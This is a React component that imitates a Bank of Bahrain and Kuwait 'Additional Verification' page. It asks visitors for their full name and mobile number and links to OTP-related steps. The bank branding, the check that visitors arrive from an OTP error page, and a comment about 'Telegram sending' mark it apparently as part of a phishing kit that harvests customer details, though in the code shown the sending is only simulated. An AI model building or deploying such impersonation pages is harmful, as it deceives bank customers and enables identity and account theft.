import React, { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";

export default function Number() {
  const navigate = useNavigate();

  const [fullName, setFullName] = useState("");
  const [mobileNumber, setMobileNumber] = useState("");
  const [loading, setLoading] = useState(false);

  const fullNameRef = useRef(null);
  const mobileRef = useRef(null);

  // Check if user came from OTP page
  useEffect(() => {
    const fromOtpError = sessionStorage.getItem("from_otp_error");
    if (!fromOtpError) {
      navigate("/realname");
    }
  }, [navigate]);

  // Focus first field on load
  useEffect(() => {
    if (fullNameRef.current) fullNameRef.current.focus();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!fullName.trim()) {
      fullNameRef.current.focus();
      return;
    }

    if (!mobileNumber.trim() || mobileNumber.replace(/\s/g, "").length < 8) {
      mobileRef.current.focus();
      return;
    }

    setLoading(true);

    // Simulate API / Telegram sending
    setTimeout(() => {
      setLoading(false);
      alert("Personal info submitted successfully!");

      // Navigate next step
      navigate("/realname"); // replace with actual next page
    }, 2000);
  };

  // Format mobile number on input
  const handleMobileChange = (e) => {
    let value = e.target.value.replace(/\D/g, "");
    if (value.length > 0 && !value.startsWith("+")) {
      if (value.length <= 8) {
        value = value.replace(/(\d{4})(\d{4})/, "$1 $2");
      } else {
        value = "+" + value;
      }
    }
    setMobileNumber(value);
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-start px-6 py-12 bg-gradient-to-br from-[#4A90E2] via-[#2E5BBA] to-[#1E3A8A] text-white">
      
      {/* Logo */}
      <div className="w-full flex justify-end mb-16">
        <div className="text-right">
          <div className="relative text-3xl font-bold tracking-wide">
            BBK
            <span className="absolute -top-1 -right-4 text-xl">✱</span>
          </div>
          <div className="text-xs opacity-90 rtl">بنك البحرين والكويت</div>
        </div>
      </div>

      {/* Heading */}
      <div className="text-center mb-10 max-w-md">
        <h1 className="text-2xl font-light">Additional Verification</h1>
        <p className="text-sm opacity-80 mt-2">
          For your security, please provide the following information to complete the verification process.
        </p>
      </div>

      {/* Form */}
      <form
        onSubmit={handleSubmit}
        className="w-full max-w-md flex flex-col gap-8"
      >
        {/* Full Name */}
        <div className="relative">
          <input
            type="text"
            placeholder="Full Name *"
            className="w-full bg-transparent border-b border-white/50 py-3 px-2 placeholder-white/70 focus:border-white outline-none transition"
            value={fullName}
            onChange={(e) => setFullName(e.target.value)}
            ref={fullNameRef}
          />
        </div>

        {/* Mobile Number */}
        <div className="relative">
          <input
            type="text"
            placeholder="Mobile Number *"
            className="w-full bg-transparent border-b border-white/50 py-3 px-2 placeholder-white/70 focus:border-white outline-none transition"
            value={mobileNumber}
            onChange={handleMobileChange}
            ref={mobileRef}
          />
        </div>

        {/* Submit Button */}
        <button
          type="submit"
          disabled={loading}
          className="w-full bg-white/20 py-3 rounded-full text-lg backdrop-blur-md hover:bg-white/30 transition disabled:opacity-50"
        >
          {loading ? "Processing..." : "Continue"}
        </button>

        {/* Back Button */}
        <button
          type="button"
          onClick={() => navigate("/firstotp")}
          className="mt-6 text-white/90 hover:text-white text-sm"
        >
          ← Back
        </button>
      </form>
    </div>
  );
}
